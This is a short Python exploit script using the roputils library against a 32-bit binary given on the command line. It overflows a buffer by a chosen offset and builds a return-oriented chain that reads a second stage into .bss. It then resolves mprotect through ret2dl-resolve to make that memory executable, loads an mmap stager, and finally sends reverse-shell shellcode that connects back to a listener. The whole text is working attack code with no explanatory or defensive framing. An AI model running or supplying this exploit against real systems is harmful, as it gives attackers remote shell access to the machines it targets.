from roputils import *

fpath = sys.argv[1]
offset = int(sys.argv[2])

rop = ROP(fpath)
sc = Shellcode('i386')
addr_stage = rop.section('.bss') + 0x400

buf = rop.retfill(offset)
buf += rop.call('read', 0, addr_stage, 100)
buf += rop.dl_resolve_call(addr_stage, addr_stage & ~0xFFF, 0x1000, 7)
buf += rop.p(addr_stage+60)

p = Proc(rop.fpath)
p.write(p32(len(buf)) + buf)
print "[+] read: %r" % p.read(len(buf))

buf = rop.dl_resolve_data(addr_stage, 'mprotect')
buf += rop.fill(60, buf)
buf += sc.nopfill(sc.mmap_stager(), 100, buf)

p.write(buf)
with p.listen(is_shell=True) as (host, port):
    p.write(sc.reverse_shell(host, port))
